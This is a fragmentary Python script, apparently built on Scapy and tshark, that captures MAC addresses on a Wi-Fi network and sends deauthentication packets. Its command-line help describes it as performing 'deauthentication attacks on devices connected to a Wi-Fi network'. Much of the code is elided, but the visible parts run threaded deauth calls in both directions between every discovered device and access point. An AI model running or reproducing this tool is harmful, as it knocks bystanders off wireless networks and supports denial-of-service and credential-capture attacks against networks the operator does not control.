...
def deauth(target_mac, access_point_mac, interface, packet_count, interval):
    ...
    conf.use_pcap = True  # Use pcap instead of raw sockets on macOS
...
def capture_mac_addresses(interface):
    ...
    with subprocess.Popen(
        tshark_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True
    ) as tshark_process:
    ...
    with concurrent.futures.ThreadPoolExecutor(max_workers=4) as executor:
        for wifi in maccy:
            for device in maccy:
                ...
                try:
                    executor.submit(
                        deauth, device, wifi, interface, packet_count, interval
                    )
                    executor.submit(
                        deauth, wifi, device, interface, packet_count, interval
                    )
...
def main():
    parser = argparse.ArgumentParser(
        description="Perform deauthentication attacks on devices connected to a Wi-Fi network."
    )
    parser.add_argument(
        "-i",
        "--interface",
        type=str,
        default="en0",
        help="Network interface to use for the attack (default: en0)",
    )
    parser.add_argument(
        "-c",
        "--count",
